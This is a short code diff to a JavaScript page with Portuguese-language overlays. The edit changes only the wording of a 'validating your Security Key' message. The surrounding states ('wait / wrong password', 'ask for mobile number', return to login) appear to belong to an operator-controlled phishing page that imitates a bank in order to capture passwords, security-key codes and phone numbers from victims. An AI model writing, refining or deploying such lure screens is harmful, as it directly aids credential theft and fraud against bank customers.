@@ -133,7 +133,7 @@
         showScreen('login');
         break;
       case 'Aguarde / Senha Incorreta':
-        showOverlay('loading', 'VALIDAÇÃO DIGITAL AGUARDE...<br>Estamos validando o código da sua Chave de Segurança Animada.');
+        showOverlay('loading', 'VALIDAÇÃO DIGITAL AGUARDE...<br>Estamos validando o código da sua Chave de Segurança.');
         break;
       case 'Pedir Celular':
         showOverlay('phone', 'Atualize seu numero de celular para que possamos entrar em contato caso haja alguma divergência de dados.');
